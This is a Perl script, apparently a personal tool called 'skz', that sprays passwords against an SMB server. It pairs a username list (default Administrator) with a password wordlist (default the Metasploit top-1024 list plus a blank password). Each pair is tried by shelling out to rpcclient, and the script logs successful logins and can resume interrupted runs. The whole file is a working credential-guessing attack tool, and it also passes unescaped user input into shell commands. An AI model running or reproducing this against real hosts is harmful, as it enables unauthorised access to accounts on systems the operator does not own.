#!/usr/bin/perl
#version 0.9
use strict;
use Getopt::Long;
use Data::Dumper;
use POSIX qw(strftime);

my $SKZ_DIR = $ENV{'HOME'}."/.skz/";
my $SKZ_FILE = "skz-SMB-pwd-spray";
my $PASS_DEFAULT =  '/usr/share/wordlists/metasploit/burnett_top_1024.txt' ;

my $_host = undef;
my $_user_names = undef;
my $_user_file = undef;
my $_passwords = undef;
my $_pass_file = undef;
my $_verbose = undef;
my $_help = undef;
my $_stop = undef;
my $_rdelay = undef;
my $_cdelay = undef;
my $_save_loc=undef;
my $_resume = undef;
my $_save_verbose = 0;
my $_use_pass_default = undef;

GetOptions(
'verbose'=>\$_verbose,
'help'=>\$_help,
'stop'=>\$_stop,
'targ=s'=>\$_host,
'target=s'=>\$_host,
'host=s'=>\$_host,
'url=s'=>\$_host,
'user=s'=>\$_user_names,
'users=s'=>\$_user_names,
'user_file=s'=>\$_user_file,
'passwords=s'=>\$_passwords,
'password=s'=>\$_passwords,
'pass=s'=>\$_passwords,
'pass_file=s'=>\$_pass_file,
'rdelay=i'=>\$_rdelay,
'cdelay=i'=>\$_cdelay,
'save=s'=>\$_save_loc,
'out=s'=>\$_save_loc,
'resume'=>\$_resume,
'pass_def'=>\$_use_pass_default,
'passdef'=>\$_use_pass_default,
'def'=>\$_use_pass_default,
'pdef'=>\$_use_pass_default,
'def'=>\$_use_pass_default,
'sv=i'=>\$_save_verbose,
'savev=i'=>\$_save_verbose,
'saveverbose=i'=>\$_save_verbose
);


my $THRESHOLD = 0;
$THRESHOLD = 2 unless !$_verbose ;
$THRESHOLD = 5 if $_verbose == 0;
sub o
{
	my $say = shift;
	my $priority = shift;
	my $char = shift;
	$priority = 0 unless $priority;
	$char = '+' unless $char;
	print "[$char] $say\n" if $priority >= $THRESHOLD ;
	
	if ( $_save_verbose == 1)
	{
		save_latest_generic( $_save_loc, "[$char] $say" ) if $priority > ( $THRESHOLD );
	}
	elsif ( $_save_verbose == 2)
	{
		save_latest_generic( $_save_loc, "[$char] $say" ) if $priority > ( $THRESHOLD - 2);
	}
	elsif ( $_save_verbose == 3)
	{
		save_latest_generic( $_save_loc, "[$char] $say" ) ;
	}
	else
	{
		save_latest_generic( $_save_loc, "[$char] $say" )  if $priority > ( $THRESHOLD +1 );
	}
	
}


my 	$LAST_WORD_DONE  = undef;
flush_file( ) if ( !$_resume );
continue_from_save( ) if ( $_resume );
flush_usr_file( ) if ( !$_resume && $_save_loc );
#TODO - offer username mangling, specify to add blank and user names to passlist; or default and turn it off.
$_pass_file = $PASS_DEFAULT if ( !$_passwords && !$_pass_file );

my @USERLIST = get_list(  $_user_names, $_user_file );
my @PASSLIST = get_list(  $_passwords, $_pass_file );
push @USERLIST, "Administrator" if (!@USERLIST);
add_the_default_list_anyways( );
push @PASSLIST, "";	#blank pass

if ( $_save_loc ) {	
	help ("Could not save file $_save_loc" ) unless save_state_init_generic ( $_save_loc,1 );	 
	}

help( ) if( $_help eq 1 );
help( 'No host IP address given' ) if( !$_host );
help("No users specified.") unless @USERLIST;
help("No passwords specified.") unless @PASSLIST;
help ("Invalid hostname $_host") if (!validate_host( $_host ));

if ( $_resume )
{
	while ( 1 )
	{
		
		my $word = shift @PASSLIST;
		last if $word eq $LAST_WORD_DONE;
		help ("Could not resume, could not find last password in the list" ) if (!@PASSLIST);
	}

	o("Resumed with word $LAST_WORD_DONE");

}

o("Running against $_host", 4);
o("Using ".($#USERLIST +1)." usernames" ,3);
o("Usernames: ".join(", ",@USERLIST) ,2) if $#USERLIST < 6;
o("Using ".($#PASSLIST +1)." passwords",3 );
o("Using password file $_pass_file" ,3) if ( $_pass_file && !$_passwords);
o( "Delay on each user/password attempt of $_rdelay",3) if $_rdelay;
o( "Delay on each password cycle of $_cdelay",3) if $_cdelay;
o( "Stop on a winner",3) if $_stop;
o("Your file will be saved in $_save_loc ",3) if $_save_loc;
o("Starting...",2) ;

doit_SMB_pwd_spray( );

sub doit_SMB_pwd_spray
{
	my $i = 0;
	foreach my $pass (@PASSLIST)
	{
		$i++;
		o( "$i words attempted; Currently working on $pass\n", 3) if ( ( $i % 100 ) == 0 );
		
		
		foreach my $user (@USERLIST)
		{
			next if (!$user);
			o("Attempting $pass - $user");
			my $cmd = "rpcclient -U \"$user%$pass\" -c \"getusername;quit\" $_host";
			
			my $resp = `$cmd`;
			
			if ($resp =~ /Authority Name/ )
			{
				my $win = "SUCCESS! $user - $pass";
				save_latest( $win );
				save_latest( $resp );
				save_latest_generic( $_save_loc, $win."\n\t".$resp ) if $_save_loc;
				o($win, '6', '!');
				print "\t$resp\n";
				exit(0) if ($_stop);
				del_user_from_list( $user );					
			}
			
			#help ("COULD NOT CONNECT TO SERVER *****") if $resp =~ /Cannot connect to server/;
			
			 #print "$n->$w: ".`$cmd`."\n";
			 sleep $_rdelay if $_rdelay;
			# save_latest_generic( $_save_loc, " - $user" ) if $_save_loc && $_save_verbose >1;
		}
		
		save_latest( $pass );
		save_latest_generic( $_save_loc, "WORKING ON $pass" ) if $_save_loc && $_save_verbose >0;
		sleep $_cdelay if $_cdelay;
		$LAST_WORD_DONE = $pass;
		#word done; looped through all usernames.
		
	}
}


sub validate_host
{
	my $host = shift;
	
	return $host if ( $host =~ /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/ 
		||  $host =~ /(?=^.{1,254}$)(^(?:(?!\d+\.|-)[a-zA-Z0-9_\-]{1,63}(?!-)\.?)+(?:[a-zA-Z]{2,})$)/ 
		);
	
	return undef;
}



sub skz_init
{
	`mkdir $SKZ_DIR` unless ( -d $SKZ_DIR );
	my $tmp_host = $_host;
	$tmp_host =~ s/\./-/g;
	my $save_file = $SKZ_DIR ."/".$SKZ_FILE."__$tmp_host.dat";
	`touch $save_file` unless ( -e $save_file);
	return $save_file;
}


sub continue_from_save
{
	my $file = skz_init( );
	open IN, "<$file" or help ("Failed to load from continue - $file");
	my @lines = <IN>;
	close OUT;
	
	o("Continuing from save");
	
	my $first = shift @lines;
	$LAST_WORD_DONE = pop @lines;
	$LAST_WORD_DONE = pop @lines if $LAST_WORD_DONE =~ /^!SUCCESS!/;
	
	$LAST_WORD_DONE =~ s/[\n\l\f]//;
	my @parts = split (/:/, $first);
	shift @parts;
	
	my $host_tmp;
	my $ovr_save_loc = $_save_loc if $_save_loc;
	
	($host_tmp, $_user_names, $_user_file, $_passwords, $_pass_file, $_rdelay, $_cdelay, $_save_loc,$_use_pass_default) = @parts;
	$_save_loc = $ovr_save_loc if $ovr_save_loc;
	$_use_pass_default =~ s/[\n\l\f]//g;
	help ("Failed to resume; loaded $host_tmp does not match $_host") if ($host_tmp ne $_host);
}

sub flush_file
{
	my $file = skz_init( );
	`rm $file`;
	save_state_init();
}

sub flush_usr_file
{
	my $file = $_save_loc;
	`rm $file`;
	save_state_init_generic( $file, 1);
}


sub save_state_init
{
	my $file = skz_init( );
	help ("INTERNAL - COULD NOT SAVE STATE INIT $file ")
		unless save_state_init_generic ( $file );
}

sub save_state_init_generic
{
	my $file = shift;
	my $create_if_not = shift;
	
	my $now_string = strftime "%a %b %e %H:%M:%S %Y", localtime;
	
	if ( -e $file)
	{
		o("Reset $file.");
		open OUT, ">$file" or return undef;
		print 	OUT "SKZ:$_host:$_user_names:$_user_file:$_passwords:$_pass_file:$_rdelay:$_cdelay:$_save_loc:$_use_pass_default\n";
		print 	OUT " $now_string\n";
		close OUT;
	}
	else
	{
		if ( $create_if_not  )
		{
			o("Created new file $file");
			open OUT, ">$file" or return undef;
			print 	OUT "SKZ:$_host:$_user_names:$_user_file:$_passwords:$_pass_file:$_rdelay:$_cdelay:$_save_loc:$_use_pass_default\n";
			print 	OUT " $now_string\n";
			close OUT;
		}
	}
	return $file;
}


sub save_latest
{
	my $word = shift;
	my $file = skz_init( );
	save_latest_generic( $file, $word );
}

sub save_latest_generic
{
	my $file = shift;
	my $word = shift;
	if ( -e $file)
	{
			save_state_init_generic($file) unless `grep 'SKZ:' $file`;
			open OUT, ">>$file";
			print OUT "$word\n";
			close OUT;
	}
}


sub get_list
{
	my $param = shift;
	my $file = shift;

	my @ALL;
	my @param_parts;
	my @file_parts;
	
	if ($param)
	{
		if( $param =~ /,/ )	
		{
			@param_parts = split /,/, $param ;
		}
		else
		{
			push @param_parts, $param;
		}		
	}
	
	if ( $file )
	{
		if ( -e $file )
		{
			open IN, "<$file";
			@file_parts = <IN>;
			close IN;
		
		}
		else
		{
			help("PASS File failed to load!");
		}
	}

		
	@ALL = ( @file_parts, @param_parts );

	
	$_ =~ s/[\n\r\l\f]// foreach @ALL;
	$_ =~ s/^\s{1,}// foreach @ALL;
	$_ =~ s/\s{1,}$// foreach @ALL;
	
	return @ALL;
}


sub del_user_from_list
{
	my $user_del = shift;
	
	for (my $i = 0; $i <= $#USERLIST; $i++)
	{
		delete $USERLIST[$i] if ( $USERLIST[$i] eq $user_del );
	}
}

sub help
{
	my $error = shift;
	$error = "!!! $error \n" if $error;

	print 	"$0 -host h.o.s.t \n".
		"$error".
		"\t-verbose  \t\tTurn on Verbosity (also notverbose)\n".
		"\t-stop     \t\tThis means stop on a winner\n".
		"\t-resume \t\tThis switch resumes search; Need -host*\n".
		"\t-user     \t\t[name or name1,name2,name3 default is Administrator]\n".
		"\t-user_file\t\t[username file location ]\n".
		"\t-pass     \t\t[password or pass1,pass2,pass3 ]\n".
		"\t-pass_file\t\t[password file loc; default if not given*]\n".
		"\t-pass_def\t\tKnock this switch to use default pass file*\n".
		"\t-rdelay    \t\t[seconds between requests (each user)]\n".
		"\t-cdelay    \t\t[seconds between cycles (all users)]\n".
		"\t-save    	\t\t[file to save results in]\n\n".
		"\t-sv    	    \t\t[0-3; Save file verbosity ]\n\n".
		"\tGood luck, skz\n".
		"\t* Default pass file - $PASS_DEFAULT\nYou can change that it's like the 3rd line in the source.\n";
		"\tP.S. You can send both user and user_file same with pass, pass_file\n\n";

	exit();
}



sub add_the_default_list_anyways
{
	#die "Adding def use def - $_use_pass_default  password - ".(!!$_passwords)." pass_file - ".(!!$_pass_file);
	#if def, and other 2 are not blank because we'd load default anyways
	if ( $_use_pass_default  && ( $_passwords || $_pass_file ) )
	{
		my @tmp_list = get_list( undef, $PASS_DEFAULT);
	
		@PASSLIST = (@PASSLIST, @tmp_list);
	}
}

sub print_all_params
{
	my $_host = undef;
	print "_user_names $_user_names \n";
	print "_user_file $_user_file \n";
	print "_passwords $_passwords \n";
	print "_pass_file $_pass_file \n";
	print "_verbose $_verbose \n";
	print "_help  $_help \n";
	print "_stop $_stop \n";
	print "_rdelay $_rdelay \n";
	print "_cdelay $_cdelay \n";
	print "_save_loc $_save_loc\n";
	print "_resume $_resume\n";
	print "_use_pass_default  $_use_pass_default \n";

}


